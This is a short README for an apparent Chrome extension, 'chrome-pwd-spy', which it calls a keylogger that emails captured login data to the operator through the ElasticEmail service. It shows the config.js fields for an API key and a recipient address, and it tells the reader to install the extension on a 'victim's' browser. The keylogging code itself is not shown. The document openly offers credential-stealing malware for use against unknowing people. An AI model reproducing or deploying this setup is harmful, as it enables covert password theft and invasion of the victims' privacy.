### #сhrome-pwd-spy

Simplest keylogger, directly records login data to transactional email (elasticemail right now).

##### how to use ->

*js/config.js:*

```javascript
 var config = {
     'apikey' : '', //<--- Your API key there
     'subject' : 'PWD',
     'from': '',  //<--- from
     'fromName' : 'ElasticEmail',
     'to' : '', //<--- to
     'charset': 'utf-8',
     'encodingType': 'base64'
 };
```

Set your credentials, then install extension on your victim's chrome browser and that's it!
